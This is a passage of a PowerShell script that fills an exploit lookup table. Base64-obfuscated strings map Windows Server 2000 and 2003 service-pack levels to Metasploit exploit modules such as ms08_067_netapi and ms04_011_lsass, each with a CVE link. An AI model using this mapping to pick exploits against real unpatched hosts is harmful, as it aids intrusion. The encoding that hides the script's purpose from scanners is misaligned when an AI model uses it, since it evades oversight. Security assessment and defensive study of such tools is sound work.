    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA='))))  
